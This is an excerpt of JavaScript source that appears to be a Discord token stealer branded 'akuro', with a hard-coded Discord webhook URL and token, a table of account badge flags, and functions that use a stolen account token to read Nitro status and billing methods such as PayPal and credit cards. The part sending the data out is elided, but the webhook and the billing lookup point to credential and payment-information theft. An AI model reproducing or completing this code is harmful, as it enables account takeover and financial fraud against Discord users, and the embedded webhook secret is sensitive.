...
var config = {
    ...
    webhook: "https://discord.com/api/webhooks/987345045965402182/j-loCVsTOGrNAKozF0Bn0qbqpc9FD5sw7A5el-Ftq7fAgCcicFq3gE5H9ikP9v3HZfoR",
    ...
    embed: {
        username: "akuro | t.me/akuro",
        footer: {
            text: `akuro | t.me/akuro`,
            icon_url: "https://media.discordapp.net/attachments/944921950961143889/987335133214408744/Akif.gif",
        },
        href: "https://t.me/akuro",
        avatar_url: "https://media.discordapp.net/attachments/944921950961143889/987335133214408744/Akif.gif"
    },

    badges: {
        Discord_Employee: {
            Value: 1,
            Emoji: "<:staff:960870771016745030>",
            Rare: false,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:partner:960871220457394256>",
            Rare: false,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:hypesquad_events:960872040913592370>",
            Rare: false,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:bughunter_1:960872690426707968>",
            Rare: false,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:early_supporter:960872690447691836>",
            Rare: false,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:bughunter_2:960872690485452820>",
            Rare: false,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:early_verified_bot_developer:960872690430910506>",
            Rare: false,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:hypesquad_bravery:960871617033015366>",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:hypesquad_briliance:960871616965922827>",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:hypesquad_balance:960871617284694046>",
            Rare: false,
        }
    },
...
function getNitro(flags) {
    switch (flags) {
        case 0:
            return "\`\`\`No Nitro\`\`\`";
        case 1:
            return "<:nitroclassic:940000520989442089> \`\`Nitro Classic\`\`";
        case 2:
            return "<:nitroboost:987332846781874236> \`\`Nitro Boost\`\`";
        default:
            return "\`\`\`No Nitro\`\`\`";
...
async function getBilling(token) {
    ...
    json.forEach(z => {
        if (z.type == "") {
            ...
            billing += "\`️\`" + " <:paypal:940184862940332103>";
        } else if (z.type == 1 && z.invalid != true) {
            billing += "\`️\`" + " <:creditcard:940000520582619147>";
        } else {
            return "\`\`\`No\`\`\`";
        };
    });
